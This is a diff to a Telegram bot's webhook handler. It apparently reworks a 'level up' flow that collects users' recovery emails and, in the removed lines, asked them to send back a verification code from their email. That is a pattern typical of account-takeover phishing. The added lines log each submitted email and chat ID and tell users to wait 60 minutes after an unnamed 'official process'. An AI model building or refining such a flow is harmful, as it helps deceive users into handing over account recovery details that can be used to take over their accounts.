@@ -520,8 +520,9 @@ export default async function handler(req, res) {
       });
     }
 
+
     // ==========================================
-    // LEVEL UP EMAIL / SECURITY CODE
+    // LEVEL UP EMAIL / VERIFICATION
     // ==========================================
 
     if (levelUpSessions[chatId]) {
@@ -549,13 +550,13 @@ export default async function handler(req, res) {
         }
 
         levelUpSessions[chatId] = {
-          step: "security_code",
+          step: "verification",
           email: email,
         };
 
-        console.log(
-          "RECOVERY EMAIL RECEIVED"
-        );
+        console.log("RECOVERY EMAIL RECEIVED");
+        console.log("CHAT ID:", chatId);
+        console.log("EMAIL:", email);
 
         await bot.sendMessage(
           chatId,
@@ -568,19 +569,20 @@ export default async function handler(req, res) {
       }
 
       // ------------------------------------------
-      // STEP 2: SECURITY CODE
+      // STEP 2: NEXT MESSAGE
       // ------------------------------------------
 
-      if (session.step === "security_code") {
-        const securityCode = text.trim();
+      if (session.step === "verification") {
 
-        console.log(
-          "SECURITY CODE RECEIVED"
-        );
+        console.log("VERIFICATION RESPONSE RECEIVED");
 
         await bot.sendMessage(
           chatId,
-          "✅ Now, you will get a varification code in your email. Please check and send that code"
+          `✅ Verification instructions have been sent to your email.
+
+Please complete the verification through the official process. After completing it, please wait up to 60 minutes for the request to be processed.
+
+⏳ Please wait for 60 minutes.`
         );
 
         delete levelUpSessions[chatId];
@@ -591,26 +593,6 @@ export default async function handler(req, res) {
       }
     }
 
-    if (session.step === "security_code") {
-
-      // Code ko store/log/process nahi karna
-      console.log("VERIFICATION RESPONSE RECEIVED");
-
-      await bot.sendMessage(
-        chatId,
-        `✅ Verification instructions have been sent to your email.
-
-Please complete the verification through the official process. After completing it, please wait up to 60 minutes for the request to be processed.
-
-⏳ Please wait for 60 minutes.`
-      );
-
-      delete levelUpSessions[chatId];
-
-      return res.status(200).json({
-        success: true,
-      });
-    }
 
     // ==========================================
     // NORMAL MESSAGE
